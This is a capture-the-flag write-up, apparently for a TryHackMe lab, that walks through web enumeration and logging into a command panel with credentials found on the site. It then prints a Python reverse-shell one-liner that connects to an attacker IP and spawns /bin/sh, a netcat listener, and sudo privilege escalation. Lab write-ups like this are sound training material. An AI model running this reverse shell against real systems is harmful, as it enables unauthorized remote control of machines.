Steps:
If you visit the source page of the website / 

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/091d7e9e-cd17-4085-a900-afbb4a35ba87)

you will see a username that we can use later on

as we use the gobuster we can see there is a asset page in the website

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/f8051952-8613-4c36-9349-b664d1242052)

then we can see bunch of files in the assets page but there is a png that stands the most which is the portal

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/2ee3f180-59da-4112-ad59-7cf433474138)

as i think for a second that this image was being used somewhere in the website just different directory

well after few navigations to the website i used the portal keyword and add a .php extension to it

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/0a220447-e3fb-4b0d-87f9-53221ec6399c)

we know the username but we do not know the password 

so after i navigate to /robots.txt in the website i can see some words in there

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/5e26c7c3-2b3f-4e5b-957f-316947ef3215)

So i tried using the username R1ckRul3s and Wubbalubbadubdub as password in the /portal.php

and it is a success

first we can check for a few commands that we can use in the command panel

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/a51b70eb-5eb9-49e6-9b49-e9c14b91af32)

then we can check for python 3 

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/fb9030f0-29d0-4ab8-93ec-9367243ecf7e)

as we have python 3 in the command line we can use this to have a reverse shell to the server

```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.135.209",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

then we need to listen in our attacker machine

```
nc -lnvp 7777
```

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/cb6672db-ce8a-4624-8020-6a0c89dcceac)

we can use sudo -l to see some privilege

```
sudo -l
```

then sudo su if we can

now we own the box
